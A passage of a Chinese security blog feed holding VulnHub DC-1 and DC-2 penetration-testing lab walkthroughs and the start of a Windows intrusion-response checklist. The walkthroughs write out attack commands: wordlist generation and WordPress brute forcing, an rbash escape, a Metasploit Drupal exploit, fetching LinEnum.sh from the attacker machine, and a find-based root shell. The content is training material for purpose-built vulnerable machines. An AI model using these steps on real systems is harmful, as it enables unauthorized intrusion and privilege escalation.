class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在刷题过程中发现对PHP反序列化的理解还不够深刻，对于其如何通过序列化的漏洞达到执行恶意代码的过程不够清晰，于是我将遇到的PHP反序列化</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="http://www.beigui.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub_DC2靶场复现</title>
    <link href="http://www.beigui.xyz/2022/06/17/vulnhub-DC2/"/>
    <id>http://www.beigui.xyz/2022/06/17/vulnhub-DC2/</id>
    <published>2022-06-17T03:01:19.000Z</published>
    <updated>2023-03-12T13:00:46.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章是vulnhub靶场DC系列复现的第二篇，需要用到的知识点，如下</p><ul><li>字典生成工具cewl（flag2）</li><li>wpsacn(flag2)</li><li>rbash逃逸（flag4）</li><li>git提权（flag5）</li></ul><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-2,311/"><strong>DC： 2 ~ VulnHub</strong></a></p><h1 id="靶场描述（官网机翻）"><a href="#靶场描述（官网机翻）" class="headerlink" title="靶场描述（官网机翻）"></a>靶场描述（官网机翻）</h1><p>与DC-1非常相似，DC-2是另一个专门构建的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>与最初的DC-1一样，它的设计考虑了初学者的需求。</p><p>Linux技能和熟悉Linux命令行是必须的，基本的渗透测试工具的一些经验也是如此。</p><p>就像DC-1一样，有五个标志，包括最终标志。</p><p>同样，就像DC-1一样，这些标志对初学者来说很重要，但对那些有经验的人来说并不那么重要。</p><p>简而言之，唯一真正重要的标志是最终的标志。</p><p>对于初学者来说，谷歌是你的朋友。好吧，除了所有的隐私问题等等。</p><p>我还没有探索所有实现root的方法，因为我放弃了我一直在研究的先前版本，除了基本的操作系统安装之外，我开始了全新的工作。</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1.靶场搭建环节跟DC1一样流程，在搭建好靶机后，将靶机网络环境改为NAT模式。使用nmap对网段进行存活主机检测，其中IP为192.168.211.132的主机确定为DC2靶机</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617111530.png" alt="image-20220617111523670"></p><p>2.使用nmap对靶机端口和服务进行扫描，靶场开放80端口和7744端口分别是http服务和ssh服务，可以看到hhtp服务所用的是非常常见的wordpress的cms。（这里第一次扫描会无法解析服务，需要修改hosts文件使IP地址和域名能解析）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;192.168.211.132 dc-2&#x27;</span> &gt;&gt; /etc/hosts     </span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617111813.png" alt="image-20220617111813678"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>访问web服务得到flag1</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617112507.png" alt="image-20220617112507878"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>4.根据flag1提示cewl工具(kali自带)，这个工具是通过扫面网站关键字生成密码本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w out.txt    </span><br></pre></td></tr></table></figure><p>5.密码表有了,那么就应该爆破了,目标这个网站一看用的就是 wordpress,默认的登录地址一般是 <code>/wp-admin</code> 或 <code>/wp-login.php</code>，这里可以使用burp+out.txt的组合爆破还可以使用wpscan(一款专门针对wordperss的扫描工具，kali自带)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br><span class="line">wpscan --url http://dc-2 --passwords out.txt</span><br></pre></td></tr></table></figure><p>爆破出两个账户密码</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617113139.png" alt="image-20220617113139307"></p><p>5.使用账户密码登录wp后台获取flag2</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617113258.png" alt="image-20220617113258418"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p>机翻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果你无法利用 WordPress 并采取捷径，那还有另一种方法。</span><br><span class="line"></span><br><span class="line">希望你找到另一个入口点。</span><br></pre></td></tr></table></figure><p>flag 提示,如果 wordpress 打不下来,就得换一个入口</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>既然他说了此路不通，那我们就换一个方向，既然我们这里得到了两个账户密码，尝试使用其登录ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.141.136 -p 7744</span><br></pre></td></tr></table></figure><p>登录成功后发现目录下存在flag3.txt，但是cat无法读取，rbase是受限制的shell环境，使用自动补全命令compgen -c</p><p>可以看到我们能使用 less 和 vi ,less 查看 flag3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>机翻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可怜的老 Tom 总是追随 Jerry。 也许他应该承受自己造成的所有压力。</span><br></pre></td></tr></table></figure><p>这里提示了之前爆破出的2个 web 用户,会不会 linux 也有这2个用户?查看 passwd 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617114036.png" alt="image-20220617114036457"></p><p>可见 jerry 用户存在,那么下面就是 rbash 逃逸–&gt;提权</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">【渗透测试】— rbash逃逸方法简述_通地塔的博客-CSDN博客_&#x2F;bin&#x2F;rbash</a></p><p>使用 vi 进行逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim/vi进入之后</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh <span class="comment"># 或者用/bin/bash</span></span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ok,现在是正常的 shell 环境了,在提权之前,尝试登录 jerry 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617114709.png" alt="image-20220617114709773"></p><p>获得flag4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet.</span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).</span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><p>机翻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">很高兴看到你已经做到了这一点-但你还没有回家。</span><br><span class="line"></span><br><span class="line">你仍然需要获得最终标志（唯一真正重要的标志！！！）。</span><br><span class="line"></span><br><span class="line">这里没有提示-你现在就一个人了。 :-)</span><br><span class="line"></span><br><span class="line">继续-git outta here !!!!</span><br></pre></td></tr></table></figure><p>这里提到了 git,那么就用它提权</p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p><a href="https://blog.csdn.net/G_Fu_Q/article/details/116276096"> git提权方法_小郭学安全的博客-CSDN博客_git提权</a></p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220617115001.png" alt="image-20220617115001633"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这篇文章是vulnhub靶场DC系列复现的第二篇，需要用到的知识点，如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字典生成工具cewl（flag2）&lt;/l</summary>
      
    
    
    
    
    <category term="vulnhub靶场复现" scheme="http://www.beigui.xyz/tags/vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub_DC1靶场复现</title>
    <link href="http://www.beigui.xyz/2022/06/16/vulnhub-DC1/"/>
    <id>http://www.beigui.xyz/2022/06/16/vulnhub-DC1/</id>
    <published>2022-06-16T08:13:49.000Z</published>
    <updated>2023-03-12T13:00:40.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在家空闲时间增多，遂将vulhub靶场复现记录一番，第一篇文章从DC1开始写起，DC系列靶场在官方描述中属于初级靶场，所以我们先由DC1开始由浅入深。</p><h1 id="靶场描述-官网机翻"><a href="#靶场描述-官网机翻" class="headerlink" title="靶场描述(官网机翻)"></a>靶场描述(官网机翻)</h1><p>DC-1是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</p><p>它旨在为初学者带来挑战，但它的难易程度将取决于您的技能和知识以及您的学习能力。</p><p>要成功完成此挑战，您将需要Linux技能，熟悉Linux命令行以及基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。</p><p>有多种方法可以获得根，但是，我已经包含了一些包含初学者线索的标志。</p><p>总共有五个标志，但最终目标是在根的主目录中查找并读取该标志。您甚至不需要是root就可以执行此操作，但是，您将需要root权限。</p><p>根据您的技能水平，您可以跳过查找这些标志中的大多数，并直接找到根。</p><p>初学者可能会遇到以前从未遇到过的挑战，但是Google搜索应该是获得完成此挑战所需信息所需的全部内容。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在官网下载DC1的系统压缩包 <a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>将压缩包解压后使用vm虚拟机打开，获得一个Linux系统，将虚拟机设置为NAT模式，使其和我们的攻击机在一个局域网环境下。</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>1.我们先查看攻击机IP地址和所在局域网掩码。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616165648.png" alt="image-20220616162316861"></p><p>2.使用nmap对网段攻击机和靶机所在局域网进行扫描，检测存活主机。结果如下图所示，其中抛去网关和攻击机IP可以确定靶机为192.168.211.131</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616165948.png" alt="image-20220616165948499"></p><p>3.对靶机IP进行扫描，从图片中可以看出靶机一共开放三个端口分别是22，80，111。其中80端口运行的cms为drupal 7,我们以此为突破口多靶机进行攻击。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616170219.png" alt="image-20220616170219676"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.Drupal 7存在多个CVE漏洞，我们先尝试使用msf中所带的exp进行攻击，通过search进行搜索可以看到msf中存在多个Drupal的exp，我们使用横线标注的exp进行攻击</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616191621.png" alt="image-20220616170735515"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon </span><br><span class="line">set rhosts 192.168.211.131</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616191554.png" alt="image-20220616171121092"></p><p>2.使用上面的配置命令成功获得meterpreter的反弹shell，输入shell命令获取linux的shell，如图所示</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616191603.png" alt="image-20220616174929398"></p><p>但是这样的shell存在很大的弊端既不美观用起来也很别扭，所以我们这里使用python语句获取tty</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616175531.png" alt="image-20220616175110128"></p><p>使用find命令查询flag，获得flag1.txt。flag1.txt中一句英文，<strong>Every good CMS needs a config file - and so do you</strong></p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616175731.png" alt="image-20220616175731653"></p><p>说明第二个flag2是在Drupal配置文件当中。这里先放下既然拿到了shell肯定是要看一眼&#x2F;etc&#x2F;passwd，然后在etc&#x2F;passwd发现了点东西</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616191123.png" alt="image-20220616191123125"></p><p>这里竟然存在一个flag4的用户，我们进入到flag4用户下发现flag4.txt，读取flag4.txt。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure><p>这里是让我们读取root目录下的flag，这里就需要用到提权的手段了。我们先收集一波信息看一下系统的版本。我们可以看到靶机系统是Debian 3.2.102-1，在网上检索一下这个版本的提权方法</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616182704.png" alt="image-20220616182704942"></p><p>这里使用LInuEnum进行提权</p><p>kali 下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rebootuser/LinEnum.git</span><br></pre></td></tr></table></figure><p>将LinEnum目录下面的LinEnum.sh放到kali的http服务主目录下，在我们之前获取到的靶机shell下进行下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.211.130/LinEnum.sh</span><br><span class="line">bash LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616190756.png" alt="image-20220616190756063"></p><p>执行完毕后得到输入，获得root权限，在root目录下得到最终flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220616191011.png" alt="image-20220616191011770"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在家空闲时间增多，遂将vulhub靶场复现记录一番，第一篇文章从DC1开始写起，DC系列靶场在官方描述中属于初级靶场，所以我们先由DC1</summary>
      
    
    
    
    
    <category term="vulnhub靶场复现" scheme="http://www.beigui.xyz/tags/vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>windows应急响应入侵排查</title>
    <link href="http://www.beigui.xyz/2022/06/15/windows-blue-Team/"/>
    <id>http://www.beigui.xyz/2022/06/15/windows-blue-Team/</id>
    <published>2022-06-15T00:32:49.000Z</published>
    <updated>2023-03-12T13:02:56.664Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>当企业发生黑客入侵、系统崩溃或其他影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短的时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p></blockquote><blockquote><p>常见的应急响应事件分类：</p></blockquote><ul><li>web入侵：网页挂马、主页篡改、Webshell</li><li>系统入侵：病毒木马、勒索软件、远控后门</li><li>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</li></ul><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。</p><h1 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h1><h2 id="一、检查系统账号安全"><a href="#一、检查系统账号安全" class="headerlink" title="一、检查系统账号安全"></a>一、检查系统账号安全</h2><h3 id="1-查看服务器是否有弱口令，远程管理端口是否对往公网开放。"><a href="#1-查看服务器是否有弱口令，远程管理端口是否对往公网开放。" class="headerlink" title="1.查看服务器是否有弱口令，远程管理端口是否对往公网开放。"></a>1.查看服务器是否有弱口令，远程管理端口是否对往公网开放。</h3><p>检查方法：</p><p>a、根据实际情况咨询相关服务器管理员。</p><p>b、根据弱口令检查工具来检查弱口令。</p><h3 id="2-查看服务器是否存在可疑账号、新增账号。"><a href="#2-查看服务器是否存在可疑账号、新增账号。" class="headerlink" title="2.查看服务器是否存在可疑账号、新增账号。"></a>2.查看服务器是否存在可疑账号、新增账号。</h3><p>检查方法：</p><p>打开cmd窗口，输入<code>lusrmgr.msc</code>命令，查看是否有新增&#x2F;可疑的账号，如有管理员群组的（Administrator）里的新增账号，请立即禁用或删除。</p><p><a href="https://github.com/Lorna-Dane/Blue-Team/blob/main/img/win%E5%BA%94%E6%80%A5img/1.png"><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/win%E5%BA%94%E6%80%A5img/1.png" alt="img"></a></p><h3 id="3-查看服务器是否存在隐藏账号、克隆账号。"><a href="#3-查看服务器是否存在隐藏账号、克隆账号。" class="headerlink" title="3.查看服务器是否存在隐藏账号、克隆账号。"></a>3.查看服务器是否存在隐藏账号、克隆账号。</h3><p>检查方法：</p><p>a、打开注册表，查看管理员对应键值。对应的位置为：<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/</code></p><p>b、cmd输入<code>net user</code>，查看是否有陌生账号。</p><p>c、使用D盾测试、它集成了对克隆账号检测的功能。</p><p><a href="https://github.com/Lorna-Dane/Blue-Team/blob/main/img/win%E5%BA%94%E6%80%A5img/2.png"><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/win%E5%BA%94%E6%80%A5img/2.png" alt="img"></a></p><h3 id="4-结合日志，查看管理员登陆时间、用户名是否存在异常。"><a href="#4-结合日志，查看管理员登陆时间、用户名是否存在异常。" class="headerlink" title="4.结合日志，查看管理员登陆时间、用户名是否存在异常。"></a>4.结合日志，查看管理员登陆时间、用户名是否存在异常。</h3><p>检查方法：</p><p>a、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开“事件查看器”。 &#x2F;&#x2F;事件查看器检查方法会另出一篇教程。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p><h2 id="二、检查异常端口、进程"><a href="#二、检查异常端口、进程" class="headerlink" title="二、检查异常端口、进程"></a>二、检查异常端口、进程</h2><h3 id="1-检查端口连接情况，是否有远程连接、可疑连接。"><a href="#1-检查端口连接情况，是否有远程连接、可疑连接。" class="headerlink" title="1.检查端口连接情况，是否有远程连接、可疑连接。"></a>1.检查端口连接情况，是否有远程连接、可疑连接。</h3><p>检查方法：</p><p>a、<code>netstat -ano</code>查看目前的网络连接，定位可疑的<code>ESTABLISHED</code>。</p><p>b、根据netstat定位出的pid，再通过tasklist命令进行进程定位<code>tasklist | findstr &quot;PID&quot;</code></p><h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2.进程"></a>2.进程</h3><p>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境&gt;正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p><p>b、D盾也可以查看进程，关注没有签名信息的进程。</p><p>c、通过微软官方提供的<code>Process Explorer</code>等工具进行排查。</p><p>d、查看可疑的进程及其子进程。可疑通过观察一下内容：</p><ul><li>没有签名验证信息的进程</li><li>没有描述信息的进程</li><li>进程的属主</li><li>进程的路径是否合法</li><li>CPU或内存资源占用长时间过高的进程</li></ul><h3 id="3-小技巧"><a href="#3-小技巧" class="headerlink" title="3.小技巧"></a>3.小技巧</h3><p>a、查看端口对应的 PID： <code>netstat -ano | findstr “port”</code></p><p>b、查看进程对应的 PID：<code>任务管理器--查看--选择列--PID</code> 或者 <code>tasklist | findstr “PID”</code></p><p>c、查看进程对应的程序位置： 任务管理器–选择对应进程–右键打开文件位置</p><h2 id="三、检查启动项、计划任务、服务"><a href="#三、检查启动项、计划任务、服务" class="headerlink" title="三、检查启动项、计划任务、服务"></a>三、检查启动项、计划任务、服务</h2><h3 id="1-检查服务器是否有异常启动项"><a href="#1-检查服务器是否有异常启动项" class="headerlink" title="1.检查服务器是否有异常启动项"></a>1.检查服务器是否有异常启动项</h3><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p><p>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p><p>c、单击【开始】&gt;【运行】，输入 <code>regedit</code>，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><ul><li>HKEY_CURRENT_USER&gt;software&gt;micorsoft&gt;windows&gt;current&gt;version&gt;run</li><li>HKEY_LOCAL_MACHINE&gt;Software&gt;Microsoft&gt;Windows&gt;CurrentVersion&gt;Run</li><li>HKEY_LOCAL_MACHINE&gt;Software&gt;Microsoft&gt;Windows&gt;CurrentVersion&gt;Runonce</li></ul><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code>。</p><p><a href="https://github.com/Lorna-Dane/Blue-Team/blob/main/img/win%E5%BA%94%E6%80%A5img/3.png"><img src="https://github.com/Lorna-Dane/Blue-Team/raw/main/img/win%E5%BA%94%E6%80%A5img/3.png" alt="img"></a></p><h3 id="2-检查计划任务"><a href="#2-检查计划任务" class="headerlink" title="2.检查计划任务"></a>2.检查计划任务</h3><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入<code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p><h3 id="3-服务自启动"><a href="#3-服务自启动" class="headerlink" title="3.服务自启动"></a>3.服务自启动</h3><p>检查方法：</p><p>单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</p><h2 id="四、检查系统相关信息"><a href="#四、检查系统相关信息" class="headerlink" title="四、检查系统相关信息"></a>四、检查系统相关信息</h2><h3 id="1-查看系统版本以及补丁信息"><a href="#1-查看系统版本以及补丁信息" class="headerlink" title="1.查看系统版本以及补丁信息"></a>1.查看系统版本以及补丁信息</h3><p>检查方法：</p><p>单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</p><h3 id="2-查找可疑目录及文件"><a href="#2-查找可疑目录及文件" class="headerlink" title="2.查找可疑目录及文件"></a>2.查找可疑目录及文件</h3><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><p>Window 2003 :</p><ul><li>C:Documents and Settings</li></ul><p>Window 2008R2 :</p><ul><li>C:Users</li></ul><p>b、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><h2 id="五、自动化查杀"><a href="#五、自动化查杀" class="headerlink" title="五、自动化查杀"></a>五、自动化查杀</h2><h3 id="1-病毒查杀"><a href="#1-病毒查杀" class="headerlink" title="1.病毒查杀"></a>1.病毒查杀</h3><p>检查方法：</p><p>下载安全软件，更新最新的病毒库，进行全盘扫描。</p><h3 id="2-webshell查杀"><a href="#2-webshell查杀" class="headerlink" title="2.webshell查杀"></a>2.webshell查杀</h3><p>检查方法：</p><p>选在具体站点路径进行webshell查杀，建议使用两款webshall查杀工具同时查杀，可相互补充规则库的不足。</p><h2 id="六、日志分析"><a href="#六、日志分析" class="headerlink" title="六、日志分析"></a>六、日志分析</h2><h3 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h3><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开事件查看器。</p><p>c、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p><h3 id="2-web访问日志"><a href="#2-web访问日志" class="headerlink" title="2.web访问日志"></a>2.web访问日志</h3><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：</p><ul><li>Windows下，推荐使用EmEditor进行日志分析，支持大文本，搜索效率不错。</li><li>Linux下，使用Shell命名组合查询分析。</li></ul><h1 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h1><h2 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h2><p>PCHunter： <a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑： <a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker： <a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns： <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL： <a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><h2 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h2><p>卡巴斯基（推荐理由：绿色版、最新病毒库）： <a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p><p>大蜘蛛（推荐理由：扫描快、一次下载只能用1周，更新病毒库）： <a href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a></p><p>火绒安全软件： <a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒： <a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h2 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h2><p>CVERC-国家计算机病毒应急处理中心： <a 